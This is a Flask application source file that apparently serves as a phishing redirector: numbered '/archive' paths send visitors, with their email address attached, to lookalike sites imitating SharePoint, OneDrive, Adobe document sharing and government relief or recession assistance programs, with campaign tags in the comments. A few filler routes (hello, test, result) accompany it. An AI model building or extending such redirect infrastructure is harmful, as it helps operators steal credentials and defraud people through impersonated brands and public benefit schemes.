from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# Define redirection rules based on path
def get_redirect_url(path):
    if path == '/archive1':
        return 'https://sharepoint-secure.vercel.app/'
    elif path == '/archive2':
        return 'https://gov-communityreliefprogram.vercel.app/account.html'
    elif path == '/archive3':
        return 'https://govr-communityreliefprogram.vercel.app/account.html'
    elif path == '/archive22':
        return 'https://gov-communityreliefprogram.vercel.app/'
    elif path == '/archive33':
        return 'https://govr-communityreliefprogram.vercel.app/'
    elif path == '/archive4':
        return 'https://gov-recessionassist.vercel.app/'
    elif path == '/archive44':
        return 'https://gov-recessionassist.vercel.app/account.html'
    elif path == '/archive58578764':
        return 'https://secure-sharedposs345.vercel.app/' # B10 TRUE
    elif path == '/archive6':
        return 'https://auth-sharepointerhr.vercel.app/'
    elif path == '/archive7456':
        return 'https://auth-sharepoint.vercel.app/' # NBA-G
    elif path == '/archive8':
        return 'https://onedrive-sharing.vercel.app/'
    elif path == '/archive7':
        return 'https://auth-adobesharingdoc.vercel.app/'  # B10-Adobe
    elif path == '/archive9':
        return 'https://auth-securedfileshare.vercel.app/' # SQ-01-TRUE
    elif path == '/archive10':
        return 'https://auth-sharedpoint.vercel.app/' # SQ-02-TRUE
    elif path == '/archive11':
        return 'https://auth-sharepointfiledata.vercel.app/' # SQ-03-TRUE
    else:
        return 'https://onedrive-sharing.vercel.app/'

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/archive<int:num>')
def path_handler(num):
    path = f'/archive{num}'
    redirect_url = get_redirect_url(path)

    # Capture the email parameter from the request
    email = request.args.get('email')

    # If an email parameter is present, append it to the redirect URL
    if email:
        redirect_url = f"{redirect_url}?email={email}"

    return redirect(redirect_url)

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
